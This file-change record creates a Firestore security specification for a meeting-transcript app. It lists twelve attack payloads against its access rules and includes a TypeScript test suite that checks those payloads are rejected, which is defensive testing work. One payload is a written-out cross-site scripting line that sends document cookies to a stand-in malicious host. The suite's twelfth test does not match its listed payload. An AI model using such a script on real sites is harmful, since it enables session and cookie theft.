  file_change {
    absolute_path_uri: "file:///security_spec.md"
    file_change_type: FILE_CHANGE_TYPE_CREATE
    replacement_chunks {
      replacement_content: "# Firestore Security Specification & Vulnerability Test Suite\n\nThis specification defines the strict security guidelines, data invariants, and adversarial test cases designed to verify the robust access controls of our Firestore database.\n\n## 1. Data Invariants\n\n- **Ownership Multi-Tenancy**: Data under `/users/{userId}/...` is locked exclusively to `/users/{userId}` where `request.auth.uid == userId`. No cross-user reads or writes are allowed.\n- **Strict Registration Only**: All write operations require a verified email address (`request.auth.token.email_verified == true`).\n- **Meeting Structural Integrity**: Any meeting document must contain an `id`, a non-empty `title` (length <= 256), a localized `date` string, and an `attendees` list with at most 30 members.\n- **Dialogue Immutability**: Spoken transcripts under a meeting can only be created. They cannot be modified or deleted.\n- **Temporal Invariants**: All write transitions must securely apply `request.time` to tracking fields. Client-modified timestamps must be rejected immediately.\n\n---\n\n## 2. The \"Dirty Dozen\" Threat Payloads\n\nEach of these represents a malicious payload constructed to attempt permission bypasses, ID poisoning, privilege escalation, or resource exhaustion.\n\n### Payload 1: Profile Hijack (Writing to another user\'s root profile)\n- **Path**: `/users/attacker_uid` (Authenticated as `victim_uid`)\n- **Action**: `create` or `update`\n- **Violation**: Identity Spoofing\n\n### Payload 2: Account Cloning (Forging profile details)\n- **Path**: `/users/victim_uid` (Authenticated as `victim_uid`)\n- **Action**: `create` with `request.auth.token.email_verified == false`\n- **Violation**: Unauthorized registration of unverified email address\n\n### Payload 3: Unauthenticated Scraping (Read meetings of other users)\n- **Path**: `/users/victim_uid/meetings` (Authenticated as `guest` or another UID)\n- **Action**: `list` or `get`\n- **Violation**: Data Leakage\n\n### Payload 4: Arbitrary Meeting Injection (Creating meeting under another user)\n- **Path**: `/users/victim_uid/meetings/some_meeting_id` (Authenticated as `attacker_uid`)\n- **Action**: `create`\n- **Violation**: Cross-tenant write injection\n\n### Payload 5: Meeting ID Poisoning (Creating meeting with extreme ID length)\n- **Path**: `/users/victim_uid/meetings/A_QUITE_LONG_JUNK_ID_TO_EXHAUST_RESOURCES_AND_POISON_THE_DATABASE_INDEXES_FOR_DENIAL_OF_WALLET`\n- **Action**: `create`\n- **Violation**: Resource Poisoning via path variable abuse\n\n### Payload 6: Shadow State Injection (Adding admin attributes)\n- **Path**: `/users/victim_uid/meetings/meeting_1`\n- **Action**: `create` with schema `{ isAdmin: true, bypassSecurity: true }`\n- **Violation**: Shadow/Ghost fields definition\n\n### Payload 7: Over-sized Meeting Title (Denial of Wallet)\n- **Path**: `/users/victim_uid/meetings/meeting_1`\n- **Action**: `create` with title containing 1MB of text\n- **Violation**: Payload resource exhaustion\n\n### Payload 8: Corrupt Attendee Matrix (Malformed attendee maps)\n- **Path**: `/users/victim_uid/meetings/meeting_1`\n- **Action**: `update` with attendees list as a single plain string `\"all_everyone\"`\n- **Violation**: Schema validation bypass\n\n### Payload 9: Mutating Immutable Timeline Records (Edit final transcript)\n- **Path**: `/users/victim_uid/meetings/meeting_1/transcript/item_1`\n- **Action**: `update`\n- **Violation**: Terminal State/Immutability violation\n\n### Payload 10: Deleting Historical transcripts (Erase recorded dialogue)\n- **Path**: `/users/victim_uid/meetings/meeting_1/transcript/item_1`\n- **Action**: `delete`\n- **Violation**: Erasure of compliance dialogue records\n\n### Payload 11: Hijacking Temporal Timestamps (Forging custom date)\n- **Path**: `/users/victim_uid/meetings/meeting_1`\n- **Action**: `create` with `createdAt: \"2020-01-01T00:00:00Z\"`\n- **Violation**: Timestamp spoofing\n\n### Payload 12: Injected HTML script in transcript text\n- **Path**: `/users/victim_uid/meetings/meeting_1/transcript/item_1`\n- **Action**: `create` with text `<script>fetch(\'http://malicious.org?cookie=\' + document.cookie)</script>`\n- **Violation**: Cross-site scripting/Payload sanitization escape\n\n---\n\n## 3. The Security Rule Test Runner\n\n```typescript\n// firestore.rules.test.ts\nimport { assertFails, assertSucceeds, initializeTestEnvironment, RulesTestEnvironment } from \"@firebase/rules-unit-testing\";\nimport { doc, setDoc, getDoc, updateDoc, deleteDoc } from \"firebase/firestore\";\n\nlet testEnv: RulesTestEnvironment;\n\nbeforeAll(async () => {\n  testEnv = await initializeTestEnvironment({\n    projectId: \"decoded-archway-l8gvj\",\n    firestore: {\n      rules: `\n        rules_version = \'2\';\n        service cloud.firestore {\n          match /databases/{database}/documents {\n            // Fortress rules are declared here\n          }\n        }\n      `\n    }\n  });\n});\n\nafterAll(async () => {\n  await testEnv.cleanup();\n});\n\ndescribe(\"Fortress Security Rule Declarations - Dirty Dozen Suite\", () => {\n  \n  it(\"Payload 1: Reject Profile Hijack for write targeting another user\'s root profile\", async () => {\n    const attackerCtx = testEnv.authenticatedContext(\"attacker_uid\", { email_verified: true });\n    const attackerDb = attackerCtx.firestore();\n    const targetRef = doc(attackerDb, \"users/victim_uid\");\n    \n    await assertFails(setDoc(targetRef, {\n      uid: \"victim_uid\",\n      email: \"victim@example.com\",\n      displayName: \"Victim User\"\n    }));\n  });\n\n  it(\"Payload 2: Reject Profile write with unverified email token status\", async () => {\n    const unverifiedCtx = testEnv.authenticatedContext(\"some_uid\", { email_verified: false });\n    const db = unverifiedCtx.firestore();\n    const targetRef = doc(db, \"users/some_uid\");\n    \n    await assertFails(setDoc(targetRef, {\n      uid: \"some_uid\",\n      email: \"some@example.com\",\n      displayName: \"Unverified User\"\n    }));\n  });\n\n  it(\"Payload 3: Block Guest Users from reading meetings list\", async () => {\n    const guestCtx = testEnv.unauthenticatedContext();\n    const db = guestCtx.firestore();\n    const targetRef = doc(db, \"users/victim_uid/meetings/meeting_1\");\n    \n    await assertFails(getDoc(targetRef));\n  });\n\n  it(\"Payload 4: Reject Cross-user meeting document writing injection\", async () => {\n    const attackerCtx = testEnv.authenticatedContext(\"attacker_uid\", { email_verified: true });\n    const db = attackerCtx.firestore();\n    const targetRef = doc(db, \"users/victim_uid/meetings/meeting_1\");\n    \n    await assertFails(setDoc(targetRef, {\n      id: \"meeting_1\",\n      title: \"Legitimate Title\",\n      date: \"2026-05-26\",\n      attendees: []\n    }));\n  });\n\n  it(\"Payload 5: Block Poisoned Document IDs (over 128 chars or symbols)\", async () => {\n    const userCtx = testEnv.authenticatedContext(\"user_1\", { email_verified: true });\n    const db = userCtx.firestore();\n    const poisonId = \"A_QUITE_LONG\".repeat(20);\n    const targetRef = doc(db, `users/user_1/meetings/${poisonId}`);\n    \n    await assertFails(setDoc(targetRef, {\n      id: poisonId,\n      title: \"Title\",\n      date: \"2026-05-26\",\n      attendees: []\n    }));\n  });\n\n  it(\"Payload 6: Block unauthorized shadow fields on Create\", async () => {\n    const userCtx = testEnv.authenticatedContext(\"user_1\", { email_verified: true });\n    const db = userCtx.firestore();\n    const targetRef = doc(db, \"users/user_1/meetings/meeting_1\");\n    \n    await assertFails(setDoc(targetRef, {\n      id: \"meeting_1\",\n      title: \"Good Title\",\n      date: \"2026-05-26\",\n      attendees: [],\n      isAdmin: true,\n      bypassSecurity: true\n    }));\n  });\n\n  it(\"Payload 7: Reject meeting document with extremely large layout payload or text size\", async () => {\n    const userCtx = testEnv.authenticatedContext(\"user_1\", { email_verified: true });\n    const db = userCtx.firestore();\n    const targetRef = doc(db, \"users/user_1/meetings/meeting_1\");\n    \n    await assertFails(setDoc(targetRef, {\n      id: \"meeting_1\",\n      title: \"A\".repeat(1001), // over limit\n      date: \"2026-05-26\",\n      attendees: []\n    }));\n  });\n\n  it(\"Payload 8: Block corrupted non-array attendee list inputs\", async () => {\n    const userCtx = testEnv.authenticatedContext(\"user_1\", { email_verified: true });\n    const db = userCtx.firestore();\n    const targetRef = doc(db, \"users/user_1/meetings/meeting_1\");\n    \n    await assertFails(setDoc(targetRef, {\n      id: \"meeting_1\",\n      title: \"Title\",\n      date: \"2026-05-26\",\n      attendees: \"John, Jane, Admin\"\n    }));\n  });\n\n  it(\"Payload 9: Prevent terminal timeline updates once finalized\", async () => {\n    const userCtx = testEnv.authenticatedContext(\"user_1\", { email_verified: true });\n    const db = userCtx.firestore();\n    const targetRef = doc(db, \"users/user_1/meetings/meeting_1/transcript/item_1\");\n    \n    await assertFails(updateDoc(targetRef, {\n      text: \"Modifying text after creation is forbidden\"\n    }));\n  });\n\n  it(\"Payload 10: Reject historical transcript erasure/deletion\", async () => {\n    const userCtx = testEnv.authenticatedContext(\"user_1\", { email_verified: true });\n    const db = userCtx.firestore();\n    const targetRef = doc(db, \"users/user_1/meetings/meeting_1/transcript/item_1\");\n    \n    await assertFails(deleteDoc(targetRef));\n  });\n\n  it(\"Payload 11: Reject spoofed offline creation dates\", async () => {\n    const userCtx = testEnv.authenticatedContext(\"user_1\", { email_verified: true });\n    const db = userCtx.firestore();\n    const targetRef = doc(db, \"users/user_1/meetings/meeting_1\");\n    \n    await assertFails(setDoc(targetRef, {\n      id: \"meeting_1\",\n      title: \"Title\",\n      date: \"2026-05-26\",\n      attendees: [],\n      createdAt: \"2020-01-01T00:00:00Z\" // Spoofed\n    }));\n  });\n\n  it(\"Payload 12: Validate creation and access controls of correctly configured payloads\", async () => {\n    const userCtx = testEnv.authenticatedContext(\"user_1\", { email_verified: true });\n    const db = userCtx.firestore();\n    const targetRef = doc(db, \"users/user_1/meetings/meeting_1\");\n    \n    await assertSucceeds(setDoc(targetRef, {\n      id: \"meeting_1\",\n      title: \"Good Title\",\n      date: \"2026-05-26\",\n      attendees: [{ id: \"1\", name: \"User A\", color: \"blue\" }]\n    }));\n  });\n});\n```\n"
    }
